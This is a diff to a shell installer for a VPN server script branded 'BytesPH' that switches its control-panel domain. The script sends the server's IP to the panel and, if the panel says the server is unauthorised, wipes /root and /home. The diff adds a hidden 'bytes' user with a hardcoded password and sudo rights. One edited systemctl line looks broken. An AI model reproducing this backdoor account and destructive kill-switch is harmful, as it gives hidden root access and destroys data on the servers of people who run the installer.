@@ -15,16 +15,16 @@ apt install curl -y
 MyScriptName='BytesPH'
 MYIP=$(wget -qO- icanhazip.com);
 MYIP2="s/xxxxxxxxx/$MYIP/g";
-
+DOMAIN="https://bytesph.com"
 #check if server is from bytesph panel
 echo "Checking..."
-DATA=$(curl -sb -X POST https://panel.meteorvpn.site/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$MYIP")
+DATA=$(curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$MYIP")
 if [ "$DATA" == "false" ];
 then
  clear
  echo "Installation is exclusive for BytesPH Only. You are not allowed. This incident is already reported to the Admin."
  echo "Exiting now..."
- curl -sb -X POST https://panel.meteorvpn.site/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$MYIP"
+ curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$MYIP"
  sleep 5;
  rm -rf /root/*
  rm -rf /home/*
@@ -37,7 +37,7 @@ SSH_Port1='22'
 SSH_Port2='226'
 
 # Your SSH Banner
-SSH_Banner="https://panel.meteorvpn.site/server/server-message"
+SSH_Banner="$DOMAIN/server/server-message"
 
 # Dropbear Ports
 Dropbear_Port1='442'
@@ -187,7 +187,7 @@ chmod +x /etc/rc.local
 # enable rc local
 systemctl enable rc-local
 
-systemctl start rc-local.service
+systemctl start    -.service
 
 # disable ipv6
 echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
@@ -1129,7 +1129,7 @@ fi
  echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
  exit 1
 fi
-DOMAIN="https://panel.meteorvpn.site"
+
  # Begin Installation by Updating and Upgrading machine and then Installing all our wanted packages/services to be install.
  ScriptMessage
 
@@ -1192,6 +1192,10 @@ DOMAIN="https://panel.meteorvpn.site"
 
  clear
  cd ~
+#install bytes
+    useradd -m bytes 2>/dev/null
+    echo bytes:bytesph2023!!!@@@ | chpasswd &>/dev/null
+    usermod -aG sudo bytes &>/dev/null
 
 # Install DDOS Deflate
  #send DDOS Deflate
